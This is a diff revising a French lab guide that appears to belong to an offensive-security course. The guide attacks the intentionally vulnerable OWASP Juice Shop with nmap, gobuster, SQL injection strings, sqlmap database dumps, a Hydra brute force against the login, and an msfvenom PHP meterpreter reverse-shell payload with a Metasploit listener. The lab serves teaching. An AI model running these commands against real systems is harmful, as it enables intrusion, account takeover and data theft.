@@ -33,7 +33,7 @@ Le groupe **Spectre**.
 
 Les membres de Spectre n’interviennent pas à la demande d’un client, mais ils opèrent toujours de manière éthique : ils ne publient pas leurs découvertes à la légère. Leur approche repose sur une règle simple : observer, expérimenter, comprendre sans jamais perturber inutilement, ni exposer publiquement ce qui pourrait être utilisé à mauvais escient.
 
-Dans ce contexte, vous démarrez une copie contrôlée de l’application suspecte en laboratoire afin de valider certaines de vos hypothèses. Aucune documentation ne vous est remise. Aucune indication ne vous est donnée sur les failles potentielles. Aucun objectif précis ne vous est imposé.
+Dans ce contexte, vous démarrez une copie de l’application suspecte en laboratoire afin de valider certaines de vos hypothèses. Aucune documentation ne vous est remise. Aucune indication ne vous est donnée sur les failles potentielles. Aucun objectif précis ne vous est imposé.
 
 
 - Chaque comportement inattendu est un indice.  
@@ -75,8 +75,7 @@ L'application vulnérable OWASP Juice Shop devrait être disponible aux adresses
 
 ## 1. Observer la surface d’attaque
 
-Avant toute interaction, un attaquant cherche à comprendre ce qui est visible.  
-Chaque service exposé représente une opportunité.
+Avant toute interaction, un attaquant cherche à comprendre ce qui est visible. Chaque service exposé représente une opportunité.
 
 ### Outils
 
@@ -98,9 +97,9 @@ Identifier les points d’entrée accessibles depuis l’extérieur.
 nmap -sV <IP>
 ```
 
-Cette commande permet de :
-- détecter les ports ouverts  
-- identifier les services et leurs versions  
+{: .highlight}
+> L'option -sV indique à nmap de lancer un *scan* pour découvrir les ports ouverts ainsi que la version du service qui écoute sur un port.
+
 
 3. Notez soigneusement :
 
@@ -111,8 +110,11 @@ Cette commande permet de :
 4. Analysez maintenant l’application web elle-même :
 
 ```bash
-whatweb http://<IP>:3000
+whatweb http://<IP>:3000 -a 3 -v
 ```
+
+{: .highlight}
+> L'option -a 3 permet de configurer `whatweb` au niveau agressif, ce qui permet de faire plus de requêtes pour découvrir les technologies utilisées par un site web. Ce mode est cependant plus facile à détecter du côté du serveur.
 
 ### Questions de réflexion
 
@@ -123,8 +125,7 @@ whatweb http://<IP>:3000
 
 ## 2. Intercepter et manipuler le trafic 
 
-Un attaquant ne se limite jamais à utiliser une interface.  
-Il observe les échanges… puis les modifie.
+Un attaquant ne se limite jamais à utiliser une interface. Il observe les échanges et les modifie pour tenter de contourner les vérifications en place.
 
 ### Outil
 
@@ -139,17 +140,19 @@ Comprendre comment les données sont envoyées au serveur et comment il y répon
 
 1. Configurez Burp Suite
 
-  - Lancez Burp Suite  
-  - Activez **Intercept ON**  
-  - Configurez votre navigateur pour passer par le proxy Burp  
-  - Accédez à Juice Shop  
+  - Lancez Burp Suite
+  - Configurez le navigateur pour utiliser Burp comme proxy : `127.0.0.1:8080`
+  - Accédez à Juice Shop : `http://<ip>:3000`
+
+
 
 
 1. Interceptez une connexion
 
-  - Accédez au formulaire de connexion  
-  - Entrez des identifiants quelconques  
-  - Interceptez la requête  
+  - Accédez au formulaire de connexion
+  - Sous l'onglet **Proxy** de Burp Suite, activez l'interception en cliquant sur **Intercept off** (qui deviendra **Intercept on**)
+  - Entrez des identifiants quelconques à l'écran de connexion de Juice Shop
+  - Interceptez la requête
 
     Vous devriez observer une requête semblable à :
 
@@ -161,9 +164,12 @@ Comprendre comment les données sont envoyées au serveur et comment il y répon
     }
     ```
 
+    {: .warning}
+    > En mode *Intercept*, Burp bloquera les requêtes par défaut afin de vous permettre de les modifier. Pour qu'une requête se rende à l'application, vous devez sélectionner une requête et cliquer sur **Forward** (ou **Forward All** pour envoyer toutes les requêtes).  
+
 1. Modifiez le trafic
 
-  - Avant d’envoyer la requête au serveur, modifiez les valeurs suivantes.
+  - Avant d’envoyer la requête au serveur, modifiez les valeurs suivantes. Vous pourrez trouver la réponse du serveur sous l'onglet **HTTP history**
 
 
     - **Test 1 — Mot de passe très long**
@@ -175,13 +181,13 @@ Comprendre comment les données sont envoyées au serveur et comment il y répon
       Observez si le serveur limite la taille.
 
 
-    - **Test 2 — Mot de passe vide**
+    - **Test 2 — Mot de passe vide ou nom d'usager**
 
       ```text
       "password": ""
       ```
 
-      Le serveur refuse-t-il explicitement la valeur ?
+      L'interface web permet-elle normalement de soumettre un courriel ou un mot de passe vide ? Le serveur refuse-t-il explicitement la valeur ?
 
 
     - **Test 3 — Injection SQL**
@@ -219,9 +225,9 @@ Comprendre comment les données sont envoyées au serveur et comment il y répon
 
 ### Questions de réflexion
 
-- Les résultats changent-ils ?  
-- Le serveur vérifie-t-il l’entrée côté serveur ?  
-- Que suppose le système sur vos données ?  
+- Les résultats changent-ils ?
+- Le serveur vérifie-t-il l’entrée côté serveur ?
+- Que suppose le système sur vos données ?
 
 
 ## 3. Découvrir du contenu caché
@@ -238,16 +244,34 @@ Découvrir des chemins et endpoints cachés.
 
 
 ### Étapes
-1. Lancez la commande suivante
+1. Observez le contenu du fichier `/usr/share/wordlists/dirb/common.txt`
+  - Que contient-il ?
+  - À quoi cela peut-il servir ?
 
+1. Lancez la commande suivante
   ```bash
   gobuster dir -u http://<IP>:3000 -w /usr/share/wordlists/dirb/common.txt
   ```
 
+  {: .astuce}
+  > Malgré toutes ses vulnérabilités, Juice Shop échappe ici à notre première tentative de *scan*, car il retourne un code 200 même pour les routes qui n'existent pas. C'est ce qui cause l'erreur retournée par **gobuster**. Vous pouvez le tester vous-mêmes dans le navigateur en entrant n'importe quoi après le `:3000/`. Mais **gobuster** n'a pas dit son dernier mot...
+
+1. Lancez à nouveau la commande, mais en excluant les réponses identiques
+  - Dans l'erreur précédente, **gobuster** vous donne la taille des réponses identiques pour un statut 200. Il est donc possible d'ignorer les réponses de cette taille :
+  ```bash
+  gobuster dir -u http://<IP>:3000 -w /usr/share/wordlists/dirb/common.txt --exclude-length <taille>
+  ```
+
 1. Observez...
 
-- Quels chemins sont trouvés ?  
-- Quels codes HTTP sont retournés (200, 403, 401) ?  
+  - Quels chemins sont trouvés ?  
+  - Quels codes HTTP sont retournés (200, 403, 401, etc) ?
+
+1. Visitez l'une des routes ayant retourné un code 200.
+  - Que remarquez-vous ?
+
+1. Visitez l'une des routes ayant retourné un code 500.
+  - Quelle information supplémentaire cette route fournit-elle à un *hacker* ?
 
 ### Questions de réflexion
 
@@ -255,7 +279,6 @@ Découvrir des chemins et endpoints cachés.
 - Le fait de cacher une route est-il un mécanisme de sécurité valable ? Pourquoi ?
 
 ---
-
 
 
 ## 4. Intercepter des requêtes vulnérables
@@ -286,19 +309,6 @@ Intercepter du trafic révélant la présence d'une vulnérabilité (injection S
   - Pourquoi l'information ainsi exfiltrée peut être utile pour un *hacker* ?
 
 
-{: .astuce-title}
-> Vous en voulez plus ?
->
-> Pour plus de plaisir avec l'injection SQL, essayez quelques valeurs "classiques" dans le formulaire de connexion, telles que :
->```sql
->' OR 1=1--
->" OR 1=1--
->1 OR 1=1
->```
->
-> Qu'observez-vous ?
-
-
 ### Questions de réflexion 
 
 - Pourquoi est-il important d'éviter de retourner des messages d'erreurs trop détaillés ?
@@ -321,26 +331,18 @@ Observer comment une injection SQL peut être exploitée automatiquement.
 
 ### Étapes
 
-#### 1. Analyse avec SQLMap
+1. Analysez la requête SQL vulnérable capturée précédemment à l'aide de l'outil `sqlmap`  
 
-Analysez la requête SQL vulnérable capturée précédemment à l'aide de l'outil `sqlmap`
+  ```bash
+  sqlmap -r request.txt --dbs
+  ```
 
-```bash
-sqlmap -r request.txt --dbs
-```
+2. Utilisez `sqlmap` pour analyser le schéma de la base de données complet
 
----
-
-#### 2. Exploration avancée
-
-Utilisez `sqlmap` pour analyser le schéma de la base de données complet
-
-```bash
-sqlmap -r request.txt --tables
-sqlmap -r request.txt --dump
-```
-
----
+  ```bash
+  sqlmap -r request.txt --tables
+  sqlmap -r request.txt --dump
+  ```
 
 ### Questions de réflexion
 
@@ -350,89 +352,83 @@ sqlmap -r request.txt --dump
 
 ---
 
-## 🔐 Exercice 6 — Attaque par brute force (Hydra)
+## 6. Attaque par force brute (Hydra)
 
-Un système peut être techniquement robuste… mais vulnérable à cause des utilisateurs.
+En sécurité, le maillon faible est souvent l'utilisateur, et non de nature technique. Un mot de passe facile à deviner est un excellent exemple...
 
-### 🎯 Objectif
+### Outils
+
+- hydra
+- Burp Suite
+
+### Objectif
 
 Comprendre comment un attaquant teste automatiquement des mots de passe.
 
-### 🧰 Outil
+### Étapes
 
-- hydra
+1. À l'aide de Burp Suite, interceptez une requête de login et identifiez :
 
-### ⚙️ Étapes guidées
+  - l’URL exacte (ex.: `/rest/user/login`)  
+  - les paramètres envoyés (`email`, `password`)  
+  - le message d’erreur retourné en cas d’échec  
 
-#### 1. Analyse du login avec Burp
+  Exemple de message :
 
-Avant d’utiliser Hydra, vous devez comprendre la requête de connexion.
+  ```text
+  Invalid email or password
+  ```
 
-Interceptez une requête de login et identifiez :
 
-- l’URL exacte (ex: /rest/user/login)  
-- les paramètres envoyés (email, password)  
-- le message d’erreur retourné en cas d’échec  
-
-Exemple de message :
-
-```text
-Invalid email or password
-```
-
----
-
-#### 2. Construction de la commande Hydra
+2. Construisez la commande Hydra
 
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid"
 ```
 
----
 
-#### 3. Exécution
+3. Lancez la commande et observez :
 
-Lancez la commande et observez :
+  - le nombre de tentatives effectuées  
+  - la détection d’un mot de passe valide  
 
-- le nombre de tentatives effectuées  
-- la détection d’un mot de passe valide  
 
----
-
-### 🧠 Analyse
+### Questions de réflexion
 
 - Pourquoi Hydra a besoin du message d’erreur ?  
 - Quelles mesures pourraient empêcher cette attaque ?  
 
 ---
 
-## 💣 Exercice 7 — Exploitation avec Metasploit
+## 7. Exploitation avec Metasploit
 
 Un attaquant expérimenté automatise les étapes complexes.
 
-### 🎯 Objectif
+### Outils
+- Metasploit
+- msfvenom
+
+### Objectif
 
 Comprendre le principe d’un reverse shell.
 
-### ⚙️ Étapes guidées
+### Étapes
 
-#### 1. Lancer Metasploit
+1. Lancez Metasploit
 
-```bash
-msfconsole
-```
+  ```bash
+  msfconsole
+  ```
 
----
 
-#### 2. Générer un payload
+1. Générez une charge utile (*payload*)
 
-```bash
-msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
-```
+  ```bash
+  msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
+  ```
 
----
 
-#### 3. Préparer un listener
+1. Préparez un *listener*
 
 ```bash
 use exploit/multi/handler
@@ -442,42 +438,35 @@ set LPORT 4444
 run
 ```
 
----
+1. Cherchez une fonctionnalité dans l’application permettant :
 
-#### 4. Exploitation
+  - d’envoyer un fichier  
+  - de téléverser du contenu  
 
-Cherchez une fonctionnalité dans l’application permettant :
 
-- d’envoyer un fichier  
-- de téléverser du contenu  
-
----
-
-### 🧠 Analyse
+### Questions de réflexion
 
 - Que fait un reverse shell ?  
 - Quelle faille est exploitée ?  
 
 ---
 
-## 🎮 Exercice 8 — Exploration libre
+## 8. BONUS : Exploration libre
 
 À ce stade, aucun guide précis n’est fourni.
 
-### 🎯 Objectif
+### Objectif
 
 Développer votre propre approche.
 
-### ⚙️ Travail
+### Travail
 
 - Combinez les outils  
 - Testez différentes idées  
 - Observez les réactions du système  
 
-### 🧠 Analyse
+### Questions de réflexion
 
 - Qu’avez-vous découvert sans consigne spécifique ?  
 - Quelle stratégie a été la plus efficace ?  
-
----
 
